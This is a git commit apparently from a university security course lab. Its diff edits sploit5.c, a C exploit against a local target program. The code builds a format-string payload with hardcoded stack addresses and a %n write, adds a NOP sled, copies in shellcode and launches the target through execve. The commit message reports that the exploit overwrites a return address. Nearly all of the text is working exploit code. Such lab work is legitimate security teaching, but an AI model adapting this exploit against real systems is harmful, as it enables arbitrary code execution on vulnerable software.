476a8a43c581bf06b5bbc33210881b409cecbd7b
Megan <mkanne@stanford.edu>
2012-04-19 09:40:46 -0700

    sploit5.c sucessfully overwriting foo return address with 0x6a = 70. Buffer contains noops and shellcode.

--- pp1/sploits/sploit5.c
+++ pp1/sploits/sploit5.c
@@ -6,12 +6,23 @@
 
 #define TARGET "/tmp/target5"
 
+static char payload[1024];
+
 int main(void)
 {
   char *args[3];
   char *env[1];
+  char *fmtstr = "\x38\xfa\xff\xbf\x3c\xfa\xff\xbf_%08x.%08x.%08x.%70u%n";
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  memset(payload, 0x90, sizeof (payload));
+  memcpy(payload + 40, shellcode, strlen(shellcode));
+
+  // "0xbffffa3c"
+  strncpy(payload, fmtstr, strlen(fmtstr));
+  
+ // payload[40 + strlen(shellcode)] = '\0';
+
+  args[0] = TARGET; args[1] = payload; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
